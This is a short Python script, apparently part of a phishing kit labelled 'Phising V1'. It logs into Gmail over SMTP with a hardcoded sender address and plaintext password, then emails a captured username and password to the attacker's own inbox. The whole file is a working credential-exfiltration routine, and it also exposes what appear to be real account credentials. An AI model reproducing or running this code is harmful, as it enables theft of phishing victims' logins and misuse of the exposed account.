fme = 'billalfauzan154@gmail.com'
import smtplib
fyou = 'fauzan#15'
def send(target="",subject="",user="",pwd=""):
	txt = ""
	txt += "Username: "+user
	txt += "\nPassword: "+pwd
	txt += "\n\n"
	txt += "PFF By BILLAL FAUZAN, Jangan Di Salahgunakan :v"
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.ehlo()
	server.starttls()
	server.login(fme,fyou)
	message = 'Subject: {}\n\n{}'.format(subject, txt)
	try:
		server.sendmail(target,target,message)
	except Exception as E:
		print (E)

send(target="billal.krsz006@gmail.com",subject="Phising V1",user="test",pwd="hahah")
